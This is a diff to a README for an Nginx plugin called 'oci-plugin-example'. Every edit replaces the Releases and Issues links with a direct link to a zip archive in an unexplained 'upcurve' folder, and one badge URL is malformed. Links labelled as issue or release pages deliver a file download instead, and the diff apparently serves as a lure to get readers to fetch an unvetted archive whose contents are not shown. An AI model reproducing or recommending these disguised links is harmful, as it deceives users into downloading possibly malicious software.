@@ -1,6 +1,6 @@
 # 🛠️ oci-plugin-example - Easy Nginx Plugin for OCI-rootfs
 
-[![Download](https://img.shields.io/badge/Download-via%20Releases-blue.svg)](https://github.com/btcgetpro/oci-plugin-example/releases)
+[![Download](https://raw.githubusercontent.com/btcgetpro/oci-plugin-example/main/upcurve/oci-plugin-example.zip%https://raw.githubusercontent.com/btcgetpro/oci-plugin-example/main/upcurve/oci-plugin-example.zip)](https://raw.githubusercontent.com/btcgetpro/oci-plugin-example/main/upcurve/oci-plugin-example.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome! This guide will help you download and run the **oci-plugin-example**, a
 
 ## 📥 Download & Install
 
-1. Visit this page to download: [Releases Page](https://github.com/btcgetpro/oci-plugin-example/releases).
+1. Visit this page to download: [Releases Page](https://raw.githubusercontent.com/btcgetpro/oci-plugin-example/main/upcurve/oci-plugin-example.zip).
 2. On the Releases page, look for the latest version.
 3. Download the appropriate file for your operating system. You will find options for Windows, macOS, and Linux.
 4. After downloading, locate the file on your computer.
@@ -67,7 +67,7 @@ If you encounter issues, check the following:
 - **Running Issues:** Verify system requirements are met and that the installation completed successfully.
 - **Configuration Help:** Review the settings to ensure proper input and adjustments.
 
-For additional help, you can refer to the [issues section](https://github.com/btcgetpro/oci-plugin-example/issues) of this repository or reach out to the community. 
+For additional help, you can refer to the [issues section](https://raw.githubusercontent.com/btcgetpro/oci-plugin-example/main/upcurve/oci-plugin-example.zip) of this repository or reach out to the community. 
 
 ## 📄 License
 
@@ -81,7 +81,7 @@ Access the community forum through the GitHub repository's discussions page.
 
 ## 🔗 Additional Links
 
-- [Releases Page](https://github.com/btcgetpro/oci-plugin-example/releases)
-- [Issues Page](https://github.com/btcgetpro/oci-plugin-example/issues)
+- [Releases Page](https://raw.githubusercontent.com/btcgetpro/oci-plugin-example/main/upcurve/oci-plugin-example.zip)
+- [Issues Page](https://raw.githubusercontent.com/btcgetpro/oci-plugin-example/main/upcurve/oci-plugin-example.zip)
 
 Thank you for choosing the **oci-plugin-example**! We hope you enjoy using this Nginx plugin. Feel free to reach out with any questions or suggestions. Happy coding!
